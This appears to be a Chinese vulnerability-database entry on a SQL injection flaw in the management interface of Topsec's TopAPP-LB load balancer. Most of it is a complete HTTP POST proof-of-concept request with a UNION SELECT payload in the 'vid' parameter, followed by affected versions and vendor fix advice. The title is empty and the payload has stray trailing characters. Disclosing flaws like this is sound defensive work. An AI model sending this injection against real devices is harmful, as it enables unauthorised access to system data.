---
title: '
'
date: Sat, 12 Sep 2020 02:06:44 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 影响范围：

V1.2.8.0#xxx

#### 漏洞验证

天融信负载均衡 TopAPP-LB产品旧版本在管理面存在SQL注入漏洞，具体为在可以访问管理服务情况 下，攻击者通过构造恶意请求，利用系统检查输入条件不严格的缺陷，进一步可获取部分系统本地信息。

![img](https:////upload-images.jianshu.io/upload_images/24042893-78e93ed5b06cac9c.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/560)

```HTML
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: localhost
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded 

t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。

```

# 3、影响版本

V1.2.8.0#xxx ，该版本存在于 2014年之前销售的产品。

# 4、修复建议

如您正在使用 TopAPP-LB以上版本产品，请联系天融信当地技术团队或者官方服务热线。